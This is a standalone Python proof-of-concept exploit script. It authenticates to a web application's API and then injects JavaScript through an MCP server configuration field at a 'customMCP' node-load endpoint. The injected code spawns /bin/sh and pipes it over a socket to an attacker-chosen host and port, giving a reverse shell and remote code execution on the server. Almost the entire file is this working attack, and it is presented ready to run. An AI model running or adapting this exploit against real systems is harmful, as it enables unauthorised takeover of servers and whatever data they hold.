import requests
import sys
import base64

if len(sys.argv) < 7:
    print("python3 poc.py <url> <email> <password> <username> <lhost> <lport>")
    sys.exit(1)

base_url = sys.argv[1]
email = sys.argv[2]
password = sys.argv[3]
username = sys.argv[4]
lhost = sys.argv[5]
lport = sys.argv[6]

session = requests.Session()
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "x-request-from": "internal",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*"
}

def login():
    login_url = base_url.rstrip("/") + "/api/v1/auth/login"
    payload = {"email": email, "password": password}
    try:
        login_response = session.post(login_url, headers=headers, json=payload, timeout=10)
        if login_response.status_code == 200:
            print("Login Successful!")
            return True
        else:
            print("Login failed!")
            print(login_response.text)
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection Error: {e}")
        return False

def rce():
    rce_url = base_url.rstrip("/") + "/api/v1/node-load-method/customMCP"

    js_payload = (
        f'{{x:(function(){{'
        f'const cp = process.mainModule.require("child_process");'
        f'const net = process.mainModule.require("net");'
        f'const sh = cp.spawn("/bin/sh", ["-i"]);'
        f'const client = new net.Socket();'
        f'client.connect({lport}, "{lhost}", function(){{'
        f'    client.pipe(sh.stdin);'
        f'    sh.stdout.pipe(client);'
        f'    sh.stderr.pipe(client);'
        f'}});'
        f'return 1;'
        f'}})()}}'
    )

    payload_data = {
        "loadMethod": "listActions",
        "inputs": {
            "mcpServerConfig": js_payload
        }
    }

    try:
        print(f"[*] Sending exploit to {rce_url}...")
        req_auth = (username, password) if username and password else None

        rce_response = session.post(rce_url, headers=headers, json=payload_data, timeout=10, auth=req_auth)
        if rce_response.status_code in [200, 201]:
            print(f"[+] Exploit triggered! Check your listener on {lhost}:{lport}")
        else:
            print(f"[-] Exploit failed! Status: {rce_response.status_code}")
            print(rce_response.text)
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if login():
        rce()
